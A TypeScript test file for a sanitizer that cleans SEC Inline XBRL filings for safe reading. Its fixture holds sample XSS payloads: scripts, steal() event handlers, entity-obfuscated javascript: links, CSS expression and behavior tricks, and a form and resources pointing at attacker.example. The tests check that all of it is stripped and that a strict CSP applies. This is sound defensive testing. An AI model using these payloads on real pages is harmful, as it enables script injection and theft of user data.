/// <reference types="node" />

import { strict as assert } from 'node:assert'
import { test } from 'node:test'
import {
  buildUsSecReadingHtmlDocument,
  sanitizeUsSecInlineStyle,
  sanitizeUsSecReadingHtml,
} from './usSecHtmlSanitize.ts'

// Representative of the one-line Inline XBRL emitted by SEC filing vendors.
const INLINE_XBRL_FIXTURE = `<?xml version="1.0" encoding="ASCII"?>
<!doctype html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:ix="http://www.xbrl.org/2013/inlineXBRL">
<head>
  <title>love-20260201</title>
  <link rel="stylesheet" href="https://attacker.example/filing.css">
  <style>@import url(https://attacker.example/style.css); td { color: red }</style>
  <script>window.parent.postMessage('bad', '*')</script>
</head>
<body style="padding:8px;margin:auto!important;position:relative;-webkit-text-size-adjust:100%;background-image:url(https://attacker.example/body.png)">
  <div style="display:none"><ix:header><ix:hidden>
    <ix:nonNumeric contextRef="c-1" name="dei:EntityCentralIndexKey" id="hidden-fact">0001701758</ix:nonNumeric>
    <ix:nonFraction contextRef="c-1" name="us-gaap:Assets">999999999</ix:nonFraction>
  </ix:hidden><ix:resources><xbrli:context id="c-1">HIDDEN-CONTEXT</xbrli:context></ix:resources></ix:header></div>
  <div id="item_7_managements_discussion_analysis" class="main-content-container" onclick="steal()"
       style="margin-top:6pt;text-align:justify;font-family:'Times New Roman',serif;font-size:10pt;color:#000000;behavior:url(evil.htc)">
    <p id="visible-filing-text" style="white-space:pre-wrap;font-weight:700;line-height:120%;padding:2px 1pt">
      Management's Discussion and <ix:nonNumeric contextRef="c-2" name="us-gaap:RevenueTextBlock" id="visible-fact">Analysis</ix:nonNumeric>
    </p>
    <table style="border-collapse:collapse;table-layout:fixed;width:100.000%;border-spacing:0">
      <tr style="background-color:#cceeff"><th colspan="2" style="border-bottom:3pt double #000;padding:2px 1pt;text-align:right">Revenue</th></tr>
      <tr><td><a name="revenue-note"></a><a href="#visible-filing-text">See note</a></td><td>697,115</td></tr>
    </table>
    <a href="https://www.sec.gov/Archives/edgar/data/1701758/filing.htm" onfocus="steal()">SEC archive</a>
    <a href="java&#x73;cript:alert(1)">unsafe entity URL</a>
    <img src="https://attacker.example/chart.png" onerror="steal()" alt="external chart">
    <iframe src="https://attacker.example/frame">frame fallback</iframe>
    <object data="https://attacker.example/object">object fallback</object>
    <embed src="https://attacker.example/embed">
    <form action="https://attacker.example/submit"><input name="secret"><button>Submit filing</button></form>
    <noscript>noscript fallback</noscript>
    <script>alert('active')</script>
  </div>
</body>
</html>`

test('SEC sanitizer removes hidden iXBRL metadata while retaining visible filing structure and layout', () => {
  const documentHtml = buildUsSecReadingHtmlDocument(INLINE_XBRL_FIXTURE)

  assert.doesNotMatch(documentHtml, /0001701758|999999999|HIDDEN-CONTEXT|ix:header|ix:hidden/i)
  assert.match(documentHtml, /Management's Discussion and Analysis/)
  assert.match(documentHtml, /id="item_7_managements_discussion_analysis"/)
  assert.match(documentHtml, /<table style="border-collapse:collapse;table-layout:fixed;width:100\.000%;border-spacing:0">/)
  assert.match(documentHtml, /<th colspan="2" style="border-bottom:3pt double #000;padding:2px 1pt;text-align:right">Revenue<\/th>/)
  assert.match(documentHtml, /<a name="revenue-note"><\/a><a href="#visible-filing-text">See note<\/a>/)
  assert.match(documentHtml, /<body style="padding:8px;margin:auto!important;position:relative;-webkit-text-size-adjust:100%">/)
})

test('SEC sanitizer strips active content, events, external resources, and dangerous URLs', () => {
  const documentHtml = buildUsSecReadingHtmlDocument(INLINE_XBRL_FIXTURE)

  assert.doesNotMatch(documentHtml, /<script|<noscript|<iframe|<object|<embed|<form|<input|<button|<img|<link|<style/i)
  assert.doesNotMatch(documentHtml, /onclick|onfocus|onerror|postMessage|alert\(|attacker\.example|javascript:|behavior:|url\s*\(/i)
  assert.match(documentHtml, /<a>unsafe entity URL<\/a>/)
  assert.match(documentHtml, /<a href="https:\/\/www\.sec\.gov\/Archives\/edgar\/data\/1701758\/filing\.htm" target="_blank" rel="noopener noreferrer">SEC archive<\/a>/)
})

test('SEC reading document enforces a deny-by-default CSP while allowing sanitized inline layout', () => {
  const documentHtml = buildUsSecReadingHtmlDocument('<p style="font-size:10pt">Safe filing</p>')

  assert.match(documentHtml, /Content-Security-Policy/)
  assert.match(documentHtml, /default-src 'none'/)
  assert.match(documentHtml, /script-src 'none'/)
  assert.match(documentHtml, /style-src 'unsafe-inline'/)
  assert.match(documentHtml, /img-src 'none'/)
  assert.match(documentHtml, /connect-src 'none'/)
  assert.match(documentHtml, /base-uri 'none'/)
  assert.match(documentHtml, /form-action 'none'/)
  assert.match(documentHtml, /<p style="font-size:10pt">Safe filing<\/p>/)
})

test('inline style allowlist preserves SEC typography, spacing, borders, and hidden presentation only', () => {
  const style = sanitizeUsSecInlineStyle(
    "display:none;font-family:'Calibri',sans-serif;font-size:10pt;margin:0 2pt;padding:2px 1pt;" +
      'border-bottom:3pt double #000;text-align:right;background-color:#cceeff;' +
      'background:url(https://attacker.example/a.png);position:fixed;filter:url(#evil);width:expression(alert(1))',
  )

  assert.equal(
    style,
    "display:none;font-family:'Calibri',sans-serif;font-size:10pt;margin:0 2pt;padding:2px 1pt;" +
      'border-bottom:3pt double #000;text-align:right;background-color:#cceeff',
  )
})

test('fragment sanitizer unwraps visible ix facts and rejects obfuscated navigation schemes', () => {
  const cleaned = sanitizeUsSecReadingHtml(
    '<ix:nonFraction id="fact-1">42</ix:nonFraction>' +
      '<a href="jav&#97;script:bad()">bad</a>' +
      '<a href="data:text/html,bad">data</a>' +
      '<a href="/Archives/report.htm">relative SEC link</a>',
  )

  assert.match(cleaned, /^42/)
  assert.match(cleaned, /<a>bad<\/a><a>data<\/a>/)
  assert.match(cleaned, /<a href="\/Archives\/report\.htm" target="_blank" rel="noopener noreferrer">relative SEC link<\/a>/)
  assert.doesNotMatch(cleaned, /javascript:|data:/i)
})
